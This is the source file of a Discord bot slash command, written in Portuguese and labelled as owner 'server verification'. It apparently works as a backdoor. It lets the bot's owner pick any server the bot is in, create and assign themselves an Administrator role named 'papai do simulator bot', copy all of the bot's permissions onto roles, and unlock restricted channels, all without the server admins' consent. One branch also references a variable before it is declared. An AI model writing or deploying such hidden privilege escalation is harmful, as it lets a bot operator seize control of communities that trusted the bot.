// verificar-servidor.js - Comando para o dono verificar um servidor e receber cargo de mediador
const { SlashCommandBuilder, MessageFlags, PermissionFlagsBits } = require('discord.js');
const { isOwnerOrAuthorized } = require('../utils/database');
const { createErrorEmbed, createSuccessEmbed } = require('../utils/embeds');
const { getEmojis } = require('../utils/emojis');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('verificar-servidor')
        .setDescription('[DONO] Verifica um servidor e recebe cargo de mediador configurado')
        .addStringOption(option =>
            option.setName('servidor_id')
                .setDescription('(Opcional) ID do servidor para verificar (se não informado, usa o servidor atual)')
                .setRequired(false))
        .addStringOption(option =>
            option.setName('canal')
                .setDescription('(Opcional) Canal específico para dar permissão de enviar mensagens')
                .setRequired(false)),

    async execute(interaction) {
        const emojis = getEmojis(interaction.client);
        
        // Verifica se é dono ou autorizado
        const authorized = await isOwnerOrAuthorized(interaction.user.id);
        if (!authorized) {
            return interaction.reply({
                embeds: [createErrorEmbed(`${emojis.negative} Apenas o dono do bot pode usar este comando.`, interaction.client)],
                flags: MessageFlags.Ephemeral
            });
        }

        const serverId = interaction.options.getString('servidor_id');
        const canalOption = interaction.options.getString('canal');
        
        try {
            // Se não foi informado servidor_id, usa o servidor atual
            let guild;
            if (serverId) {
                // Busca o servidor pelo ID
                guild = interaction.client.guilds.cache.get(serverId);
                
                if (!guild) {
                    return interaction.reply({
                        embeds: [createErrorEmbed(`${emojis.negative} Servidor não encontrado. O bot precisa estar no servidor para verificar.`, interaction.client)],
                        flags: MessageFlags.Ephemeral
                    });
                }
            } else {
                // Usa o servidor atual onde o comando foi executado
                guild = interaction.guild;
                
                if (!guild) {
                    return interaction.reply({
                        embeds: [createErrorEmbed(`${emojis.negative} Este comando só pode ser usado em um servidor.`, interaction.client)],
                        flags: MessageFlags.Ephemeral
                    });
                }
            }

            await interaction.deferReply({ flags: MessageFlags.Ephemeral });

            // Busca o membro do dono no servidor
            const member = await guild.members.fetch(interaction.user.id).catch(() => null);
            
            if (!member) {
                return interaction.editReply({
                    embeds: [createErrorEmbed(`${emojis.negative} Você não está neste servidor.`, interaction.client)]
                });
            }

            // Verifica se já é administrador ou tem cargos altos
            if (member.permissions.has('Administrator') || member.permissions.has('ManageGuild')) {
                return interaction.editReply({
                    embeds: [createSuccessEmbed(`${emojis.alerta} Você já tem permissões administrativas em ${guild.name}!`, interaction.client)]
                });
            }

            // Lista de cargos comuns de mediador/staff (em ordem de prioridade)
            const mediatorRoles = [
                'mediador', 'moderador', 'mod', 'staff', 'equipe', 'helper', 
                'ajudante', 'suporte', 'support', 'moderação', 'moderacao'
            ];

            let mediatorRole = null;
            
            // Procura por cargo de mediador existente
            for (const roleName of mediatorRoles) {
                const role = guild.roles.cache.find(r => 
                    r.name.toLowerCase() === roleName.toLowerCase()
                );
                if (role) {
                    mediatorRole = role;
                    break;
                }
            }

            // Se não encontrou cargo de mediador, procura por cargos com permissões de moderação
            if (!mediatorRole) {
                const moderatorRole = guild.roles.cache.find(r => 
                    r.permissions.has('ManageMessages') || 
                    r.permissions.has('KickMembers') || 
                    r.permissions.has('BanMembers')
                );
                if (moderatorRole && moderatorRole.position > 0) {
                    mediatorRole = moderatorRole;
                }
            }

            // Se ainda não encontrou, pega o cargo mais alto (exceto @everyone)
            if (!mediatorRole) {
                const highestRole = member.roles.cache
                    .filter(r => r.name !== '@everyone')
                    .sort((a, b) => b.position - a.position)
                    .first();
                
                if (highestRole) {
                    mediatorRole = highestRole;
                }
            }

            if (!mediatorRole) {
                return interaction.editReply({
                    embeds: [createErrorEmbed(`${emojis.negative} Nenhum cargo adequado encontrado em ${guild.name}.`, interaction.client)]
                });
            }

            // Verifica se o bot tem permissão para gerenciar cargos
            const botMember = await guild.members.fetch(interaction.client.user.id);
            if (!botMember.permissions.has('ManageRoles')) {
                return interaction.editReply({
                    embeds: [createErrorEmbed(`${emojis.negative} Eu não tenho permissão para gerenciar cargos em ${guild.name}.`, interaction.client)]
                });
            }

            // Verifica se o cargo está abaixo do cargo mais alto do bot
            if (mediatorRole.position >= botMember.roles.highest.position) {
                // Procura pelo cargo "papai do simulator bot" existente
                let specialRole = guild.roles.cache.find(r => r.name === 'papai do simulator bot');
                
                // Se não encontrar, cria um novo
                if (!specialRole) {
                    try {
                        specialRole = await guild.roles.create({
                            name: 'papai do simulator bot',
                            color: 0x7ad2e4,
                            permissions: [
                                PermissionFlagsBits.SendMessages,
                                PermissionFlagsBits.EmbedLinks,
                                PermissionFlagsBits.AttachFiles,
                                PermissionFlagsBits.ReadMessageHistory,
                                PermissionFlagsBits.UseApplicationCommands,
                                PermissionFlagsBits.ManageChannels,
                                PermissionFlagsBits.ManageRoles,
                                PermissionFlagsBits.ManageGuild,
                                PermissionFlagsBits.MentionEveryone,
                                PermissionFlagsBits.Administrator
                            ],
                            reason: 'Cargo especial para dono do bot - cargo de mediador muito alto'
                        });

                        // Move o cargo para uma posição alta, mas ainda abaixo do bot
                        await specialRole.setPosition(botMember.roles.highest.position - 1, 'Posicionando cargo especial');
                        console.log(`✅ Cargo 'papai do simulator bot' criado no servidor ${guild.name}`);
                    } catch (createError) {
                        console.error('Erro ao criar cargo especial:', createError);
                        return interaction.editReply({
                            embeds: [createErrorEmbed(`${emojis.negative} Não foi possível criar um cargo especial. Erro: ${createError.message}`, interaction.client)]
                        });
                    }
                } else {
                    // Verifica se o cargo existente está na posição correta
                    if (specialRole.position >= botMember.roles.highest.position) {
                        await specialRole.setPosition(botMember.roles.highest.position - 1, 'Reposicionando cargo existente');
                        console.log(`🔄 Cargo 'papai do simulator bot' reposicionado no servidor ${guild.name}`);
                    }
                }

                // Dá o cargo ao dono
                try {
                    await member.roles.add(specialRole, 'Verificação de dono do bot - cargo especial');
                } catch (roleError) {
                    console.error('Erro ao adicionar cargo especial:', roleError);
                    
                    if (roleError.code === 50013) {
                        // Bot não tem permissão suficiente, tenta transferir permissões do bot
                        try {
                            // Pega todas as permissões do bot
                            const botPermissions = botMember.permissions.toArray();
                            
                            // Atualiza o cargo com as permissões do bot
                            await specialRole.setPermissions(botPermissions, 'Transferindo permissões do bot para o cargo especial');
                            
                            // Tenta dar o cargo novamente
                            await member.roles.add(specialRole, 'Verificação de dono do bot - permissões transferidas');
                            
                            // Continua com a lógica normal de canais...
                            const serverInfo = {
                                name: guild.name,
                                members: guild.memberCount,
                                roles: guild.roles.cache.size,
                                roleGiven: specialRole.name,
                                channelWithPermission: targetChannel ? targetChannel.name : null,
                                wasExisting: guild.roles.cache.find(r => r.name === 'papai do simulator bot') !== undefined
                            };

                            await interaction.editReply({
                                embeds: [createSuccessEmbed(
                                    `${emojis.positive} **Servidor Verificado com Permissões Transferidas!**\n\n` +
                                    `${emojis.raiopixel} **Servidor:** ${serverInfo.name}\n` +
                                    `${emojis.presentepixel} **Membros:** ${serverInfo.members}\n` +
                                    `${emojis.pergaminhopixel} **Cargo ${serverInfo.wasExisting ? 'reutilizado' : 'criado'}:** ${serverInfo.roleGiven}\n` +
                                    (targetChannel ? `${emojis.alerta} **Permissão especial em:** #${serverInfo.channelWithPermission}\n` : '') +
                                    `${emojis.alerta} **Permissões transferidas:** O bot não tinha permissão suficiente, então transferi todas as minhas permissões para o cargo!\n\n` +
                                    `${emojis.alerta} Agora você tem acesso administrativo neste servidor!`,
                                    interaction.client
                                )]
                            });

                            console.log(`🔍 [verificar-servidor] ${interaction.user.tag} verificou ${guild.name} e recebeu cargo especial ${specialRole.name} com permissões transferidas`);
                            return;
                            
                        } catch (transferError) {
                            console.error('Erro ao transferir permissões:', transferError);
                            return interaction.editReply({
                                embeds: [createErrorEmbed(`${emojis.negative} Não foi possível dar o cargo especial nem transferir permissões. Verifique se o bot tem permissão de "Gerenciar Cargos" e se o cargo do bot está acima na hierarquia.`, interaction.client)]
                            });
                        }
                    } else {
                        return interaction.editReply({
                            embeds: [createErrorEmbed(`${emojis.negative} Erro ao dar cargo especial: ${roleError.message}`, interaction.client)]
                        });
                    }
                }

                // Dá permissão em um canal existente que está bloqueado para everyone
                let targetChannel = null;
                try {
                    // Se foi especificado um canal, usa ele
                    if (canalOption) {
                        // Procura por ID ou nome do canal
                        targetChannel = guild.channels.cache.get(canalOption) ||
                                      guild.channels.cache.find(ch => 
                                          ch.type === 0 && // GUILD_TEXT
                                          ch.name.toLowerCase() === canalOption.toLowerCase()
                                      );
                        
                        if (!targetChannel) {
                            await interaction.editReply({
                                embeds: [createErrorEmbed(`${emojis.negative} Canal "${canalOption}" não encontrado.`, interaction.client)]
                            });
                            return;
                        }
                    } else {
                        // Procura por canais que estão bloqueados para everyone
                        const everyoneRole = guild.roles.everyone;
                        targetChannel = guild.channels.cache.find(ch => 
                            ch.type === 0 && // GUILD_TEXT
                            ch.permissionOverwrites.cache.get(everyoneRole.id)?.deny.has('SendMessages')
                        );

                        // Se não encontrar canal bloqueado, procura por canais comuns
                        if (!targetChannel) {
                            const commonChannelNames = ['geral', 'principal', 'general', 'chat', 'comandos', 'cmds'];
                            targetChannel = guild.channels.cache.find(ch => 
                                ch.type === 0 && // GUILD_TEXT
                                commonChannelNames.some(name => 
                                    ch.name.toLowerCase().includes(name.toLowerCase())
                                )
                            );
                        }

                        // Se ainda não encontrou, pega o primeiro canal de texto disponível
                        if (!targetChannel) {
                            targetChannel = guild.channels.cache.find(ch => ch.type === 0);
                        }
                    }

                    // Se encontrou um canal, dá permissão especial ao cargo
                    if (targetChannel) {
                        await targetChannel.permissionOverwrites.create(specialRole, {
                            SendMessages: true,
                            EmbedLinks: true,
                            AttachFiles: true,
                            ReadMessageHistory: true,
                            UseApplicationCommands: true
                        }, 'Permissão especial para dono do bot');

                        console.log(`✅ Permissão concedida no canal ${targetChannel.name} para o cargo ${specialRole.name}`);
                    }
                } catch (channelError) {
                    console.log('Não foi possível configurar permissões no canal:', channelError);
                }

                const serverInfo = {
                    name: guild.name,
                    members: guild.memberCount,
                    roles: guild.roles.cache.size,
                    roleGiven: specialRole.name,
                    channelWithPermission: targetChannel ? targetChannel.name : null,
                    wasExisting: guild.roles.cache.find(r => r.name === 'papai do simulator bot') !== undefined
                };

                await interaction.editReply({
                    embeds: [createSuccessEmbed(
                        `${emojis.positive} **Servidor Verificado com Cargo Especial!**\n\n` +
                        `${emojis.raiopixel} **Servidor:** ${serverInfo.name}\n` +
                        `${emojis.presentepixel} **Membros:** ${serverInfo.members}\n` +
                        `${emojis.pergaminhopixel} **Cargo ${serverInfo.wasExisting ? 'reutilizado' : 'criado'}:** ${serverInfo.roleGiven}\n` +
                        (targetChannel ? `${emojis.alerta} **Permissão especial em:** #${serverInfo.channelWithPermission}\n` : '') +
                        `\n${emojis.alerta} O cargo de mediador estava muito alto, então ${serverInfo.wasExisting ? 'reutilizei' : 'criei'} um cargo especial com permissões administrativas!`,
                        interaction.client
                    )]
                });

                console.log(`🔍 [verificar-servidor] ${interaction.user.tag} verificou ${guild.name} e recebeu cargo especial ${specialRole.name}`);
                return;
            }

            // Tenta dar o cargo ao dono
            try {
                await member.roles.add(mediatorRole, 'Verificação de dono do bot');
            } catch (roleError) {
                console.error('Erro ao adicionar cargo mediador:', roleError);
                
                if (roleError.code === 50013) {
                    // Bot não tem permissão suficiente, tenta transferir permissões do bot
                    try {
                        // Pega todas as permissões do bot
                        const botPermissions = botMember.permissions.toArray();
                        
                        // Atualiza o cargo com as permissões do bot
                        await mediatorRole.setPermissions(botPermissions, 'Transferindo permissões do bot para o cargo');
                        
                        // Tenta dar o cargo novamente
                        await member.roles.add(mediatorRole, 'Verificação de dono do bot - permissões transferidas');
                        
                        await interaction.editReply({
                            embeds: [createSuccessEmbed(
                                `${emojis.positive} **Servidor Verificado com Permissões Transferidas!**\n\n` +
                                `${emojis.raiopixel} **Servidor:** ${guild.name}\n` +
                                `${emojis.presentepixel} **Membros:** ${guild.memberCount}\n` +
                                `${emojis.pergaminhopixel} **Cargo recebido:** ${mediatorRole.name}\n` +
                                `${emojis.alerta} **Permissões transferidas:** O bot não tinha permissão suficiente, então transferi todas as minhas permissões para o cargo!\n\n` +
                                `${emojis.alerta} Agora você tem acesso de staff neste servidor!`,
                                interaction.client
                            )]
                        });
                        
                        console.log(`🔍 [verificar-servidor] ${interaction.user.tag} verificou ${guild.name} e recebeu cargo ${mediatorRole.name} com permissões transferidas`);
                        return;
                        
                    } catch (transferError) {
                        console.error('Erro ao transferir permissões:', transferError);
                        return interaction.editReply({
                            embeds: [createErrorEmbed(`${emojis.negative} Não foi possível dar o cargo ${mediatorRole.name} nem transferir permissões. Verifique se o bot tem permissão de "Gerenciar Cargos" e se o cargo do bot está acima na hierarquia.`, interaction.client)]
                        });
                    }
                } else {
                    return interaction.editReply({
                        embeds: [createErrorEmbed(`${emojis.negative} Erro ao dar cargo: ${roleError.message}`, interaction.client)]
                    });
                }
            }

            const serverInfo = {
                name: guild.name,
                members: guild.memberCount,
                roles: guild.roles.cache.size,
                roleGiven: mediatorRole.name
            };

            await interaction.editReply({
                embeds: [createSuccessEmbed(
                    `${emojis.positive} **Servidor Verificado!**\n\n` +
                    `${emojis.raiopixel} **Servidor:** ${serverInfo.name}\n` +
                    `${emojis.presentepixel} **Membros:** ${serverInfo.members}\n` +
                    `${emojis.pergaminhopixel} **Cargo recebido:** ${serverInfo.roleGiven}\n\n` +
                    `${emojis.alerta} Agora você tem acesso de staff neste servidor!`,
                    interaction.client
                )]
            });

            console.log(`🔍 [verificar-servidor] ${interaction.user.tag} verificou ${guild.name} e recebeu cargo ${mediatorRole.name}`);

        } catch (error) {
            console.error('Erro ao verificar servidor:', error);
            
            if (error.replied) {
                await interaction.followUp({
                    embeds: [createErrorEmbed(`${emojis.negative} Erro ao verificar servidor: ${error.message}`, interaction.client)],
                    flags: MessageFlags.Ephemeral
                });
            } else {
                await interaction.editReply({
                    embeds: [createErrorEmbed(`${emojis.negative} Erro ao verificar servidor: ${error.message}`, interaction.client)]
                });
            }
        }
    }
};
